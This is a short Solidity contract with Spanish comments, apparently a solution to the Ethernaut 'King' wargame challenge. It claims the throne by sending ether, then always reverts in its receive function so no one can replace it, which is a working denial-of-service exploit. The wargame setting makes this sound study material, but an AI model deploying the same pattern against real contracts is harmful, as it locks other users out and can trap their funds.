// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Marquesi is Ownable {
  //No usamos interface para interactuar con el contrato King ya que no invocaremos ninguna función particular suya. Simplemente le enviaremos ether.
  using Address for address payable;

  function attack(address payable challengeAddress) external payable onlyOwner {
    challengeAddress.sendValue(msg.value);
  }
  
  //Esta función podría bien no existir, lo que revertiría la transacción de aquel que desee convertirse en el nuevo rey. Para hacerlo más explícito, ponemos una condición falsa en un require.
  receive() external payable {
    require(false, "No es lo mismo que te encuentren una vulnerabilidad a que te rompan el oracle");
   }
}
